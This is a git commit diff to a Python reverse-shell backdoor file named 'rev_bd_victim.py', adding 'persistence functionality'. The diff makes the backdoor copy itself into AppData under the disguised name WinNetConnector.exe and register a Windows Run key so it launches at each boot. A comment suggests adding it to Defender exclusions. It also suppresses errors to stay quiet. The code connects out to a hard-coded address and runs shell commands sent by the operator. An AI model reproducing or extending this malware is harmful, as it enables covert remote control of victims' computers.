3a2500dfdbd6b6d37f96cd871b9ddb26e6ecb0c5
nickson8 <insigniuzap@gmail.com>
2021-12-10 18:35:09 +0400

    added persistence functionality

--- rev_bd_victim.py
+++ rev_bd_victim.py
@@ -3,16 +3,27 @@ import subprocess
 import json
 import os
 import base64
+import shutil
+import sys
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
+    def become_persistent(self):
+        file_loc = os.environ["appdata"] + "\\WinNetConnector.exe" #composing path for another copy of exploit
+
+        if not os.path.exists(file_loc): #if exploit hasn't been copied to file_loc path earlier
+            shutil.copyfile(sys.executable, file_loc) #copy exe file to different location with other fake name; add path to WinDef exclusions before this
+            subprocess.run( #add registry record to autorun our exploit with every OS start; initial exploit could be deleted
+                f'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WinNetConnect /t REG_SZ /d "{file_loc}"', shell=True)
+
     def exec_command(self, command):
         try:
-            return subprocess.check_output(command, shell=True, universal_newlines=True)
+            return subprocess.check_output(command, shell=True, universal_newlines=True, stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except subprocess.CalledProcessError:
             return False
 
@@ -82,7 +93,7 @@ class Backdoor:
                 command = self.listen()
                 if command[0] == "quit" and len(command) == 1:
                     self.connection.close()
-                    quit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_res = self.change_directory(command[1])
                 elif command[0] == "download" and len(command) > 1:
@@ -115,8 +126,11 @@ class Backdoor:
                     self.send_b64(command_res)
             except KeyboardInterrupt:
                 self.connection.close()
-                quit()
+                sys.exit()
 
 
-bd = Backdoor("192.168.0.102", 8080)
-bd.run()
+try:
+    bd = Backdoor("192.168.0.102", 8080)
+    bd.run()
+except Exception:
+    sys.exit()
